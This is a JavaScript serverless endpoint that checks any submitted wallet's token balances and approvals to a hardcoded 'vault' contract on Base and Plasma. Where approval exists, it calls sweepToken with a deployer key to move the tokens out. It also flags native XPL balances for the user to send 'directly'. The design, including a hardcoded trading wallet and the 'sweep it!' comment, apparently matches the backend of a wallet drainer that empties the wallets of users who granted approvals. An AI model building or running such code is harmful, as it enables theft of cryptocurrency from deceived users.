const { ethers } = require('ethers');

// Contract addresses
const VAULT_CONTRACTS = {
  base: '0x1f5b76EAA8e2A2eF854f177411627C9f3b632BC0',
  plasma: '0x4Fe3b7871B9F9A73567F52Bdb1621F65f6fE5E87'
};

const TRADING_WALLET = '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c';

// Known tokens to check on Base
const BASE_TOKENS = [
  '0xAC1Bd2486aAf3B5C0fc3Fd868558b082a531B2B4', // TOSHI
  // Add more known Base tokens here
];

const VAULT_ABI = [
  'function sweepToken(address user, address token, uint256 amount) external',
  'function sweepNative() external payable',
  'function checkApproval(address user, address token) external view returns (uint256)',
  'function checkBalance(address user, address token) external view returns (uint256)'
];

const ERC20_ABI = [
  'function balanceOf(address) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function symbol() view returns (string)',
  'function decimals() view returns (uint8)'
];

module.exports = async (req, res) => {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { userAddress, chain } = req.body;

    if (!userAddress || !ethers.isAddress(userAddress)) {
      return res.status(400).json({ error: 'Invalid user address' });
    }

    if (!chain || !['base', 'plasma'].includes(chain)) {
      return res.status(400).json({ error: 'Invalid chain' });
    }

    // Setup provider based on chain
    const rpcUrls = {
      base: 'https://mainnet.base.org',
      plasma: 'https://rpc.plasma.to'
    };

    const provider = new ethers.JsonRpcProvider(rpcUrls[chain]);
    const wallet = new ethers.Wallet(process.env.DEPLOYER_PRIVATE_KEY, provider);
    
    const vaultAddress = VAULT_CONTRACTS[chain];
    const vault = new ethers.Contract(vaultAddress, VAULT_ABI, wallet);

    const results = {
      chain,
      userAddress,
      vaultAddress,
      swept: [],
      needsApproval: [],
      errors: []
    };

    // For Base chain, check known tokens
    if (chain === 'base') {
      for (const tokenAddress of BASE_TOKENS) {
        try {
          const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
          
          const [balance, allowance, symbol, decimals] = await Promise.all([
            token.balanceOf(userAddress),
            token.allowance(userAddress, vaultAddress),
            token.symbol().catch(() => 'UNKNOWN'),
            token.decimals().catch(() => 18)
          ]);

          if (balance > 0n) {
            const balanceFormatted = ethers.formatUnits(balance, decimals);
            
            if (allowance >= balance) {
              // Has approval, sweep it!
              console.log(`Sweeping ${symbol}: ${balanceFormatted}`);
              const tx = await vault.sweepToken(userAddress, tokenAddress, 0);
              await tx.wait();
              
              results.swept.push({
                token: tokenAddress,
                symbol,
                amount: balanceFormatted,
                txHash: tx.hash
              });
            } else {
              results.needsApproval.push({
                token: tokenAddress,
                symbol,
                balance: balanceFormatted
              });
            }
          }
        } catch (error) {
          console.error(`Error checking token ${tokenAddress}:`, error.message);
          results.errors.push({
            token: tokenAddress,
            error: error.message
          });
        }
      }
    }

    // For Plasma chain, check native XPL balance
    if (chain === 'plasma') {
      try {
        const balance = await provider.getBalance(userAddress);
        const gasBuffer = ethers.parseEther('0.001');
        
        if (balance > gasBuffer) {
          const transferAmount = balance - gasBuffer;
          const balanceFormatted = ethers.formatEther(transferAmount);
          
          // Note: Native token needs to be sent by user, can't be swept by contract
          results.needsApproval.push({
            token: 'XPL (native)',
            balance: balanceFormatted,
            note: 'Native token requires user to send directly'
          });
        }
      } catch (error) {
        console.error('Error checking XPL balance:', error.message);
        results.errors.push({
          token: 'XPL',
          error: error.message
        });
      }
    }

    return res.status(200).json(results);

  } catch (error) {
    console.error('Sweep tokens error:', error);
    return res.status(500).json({ 
      error: 'Failed to sweep tokens',
      details: error.message 
    });
  }
};
